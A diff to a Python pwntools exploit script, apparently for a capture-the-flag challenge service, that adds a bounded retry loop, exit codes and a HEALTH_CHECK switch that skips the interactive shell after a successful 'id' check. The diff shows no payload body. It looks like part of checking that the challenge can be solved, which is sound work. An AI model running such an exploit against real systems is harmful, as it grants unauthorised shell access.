@@ -1,6 +1,9 @@
 #!/usr/bin/python
 from pwn import *
 import sys
+import os
+
+NUM_ATTEMPTS = 1000
 
 HOST = ''
 PORT = 11528
@@ -87,7 +90,8 @@ def exploit_attempt():
 		id_result = io.recvline()
 		if b'uid=' in id_result:
 			log.success('shell: %s', id_result.decode('ascii').strip())
-			io.interactive()
+			if not os.environ.get('HEALTH_CHECK', False):
+				io.interactive()
 			return True
 		else:
 			log.failure('Error: %s', id_result)
@@ -101,7 +105,8 @@ def exploit_attempt():
 
 
 if __name__ == '__main__':
-	while True:
+	for _ in range(NUM_ATTEMPTS):
 		if exploit_attempt():
-			break
-
+			sys.exit(0)
+		sleep(0.1)
+	sys.exit(1)
